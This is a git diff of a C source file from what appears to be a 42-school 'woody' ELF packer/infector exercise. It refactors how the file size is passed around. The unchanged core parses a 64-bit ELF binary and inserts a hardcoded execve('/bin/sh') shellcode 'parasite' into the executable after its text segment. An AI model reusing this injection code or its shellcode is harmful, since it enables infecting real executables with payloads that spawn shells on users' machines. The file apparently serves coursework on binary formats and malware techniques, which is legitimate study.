@@ -6,11 +6,17 @@
 /*   By: droly <marvin@42.fr>                       +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/04/12 11:28:09 by droly             #+#    #+#             */
-/*   Updated: 2018/04/16 12:01:16 by amaindro         ###   ########.fr       */
+/*   Updated: 2018/04/16 13:31:53 by amaindro         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "woody.h"
+
+
+
+#include <string.h> //KILL MEEEEEEEEEEEEEEEEEEEEEEEE
+
+
 
 static inline Elf64_Shdr *elf_sheader(Elf64_Ehdr *header) {
 		return (Elf64_Shdr *)((void*)header + header->e_shoff);
@@ -42,10 +48,11 @@ char *elf_lookup_string(Elf64_Ehdr *header, int offset) {
 }
 
 
-void	Elf64(void *ptr, void *file_end)
+void	Elf64(void *ptr, size_t size)
 {
 	char		code[] = "\x89\x5e\x1f\xeb\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
-	size_t		code_size = 129;
+	//char		code[] = "\x00\x00\x00\x01\x";
+	size_t		code_size = strlen(code);
 	int			i;
 	Elf64_Ehdr	*header;
 	Elf64_Phdr	*program;
@@ -97,17 +104,17 @@ void	Elf64(void *ptr, void *file_end)
 	write(fd, ptr, tmp_size);
 	//Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
 	write(fd, code, code_size);
-	write(fd, (ptr + tmp_size + code_size), (file_end - ptr) - (tmp_size + code_size));
+	write(fd, (ptr + tmp_size + code_size), size - (tmp_size + code_size));
 }
 
-void	magic_number(void *ptr, void *file_end, char *file_name)
+void	magic_number(void *ptr, size_t size, char *file_name)
 {
 	char *test;
 
 	test = ptr;
 	if (*(int *)ptr == *(int *)ELFMAG && test[EI_CLASS] == ELFCLASS64)
 	{
-		Elf64(ptr, file_end);
+		Elf64(ptr, size);
 	}
 	else
 		printf("Wrong file signature\n");
@@ -130,7 +137,7 @@ int		main(int ac, char **av)
 		return (0);
 	if (close(fd) < 0)
 		return (0);
-	magic_number(ptr, ptr + size, av[1]);
+	magic_number(ptr, size, av[1]);
 	if (munmap(ptr, size) < 0)
 		return (0);
 }
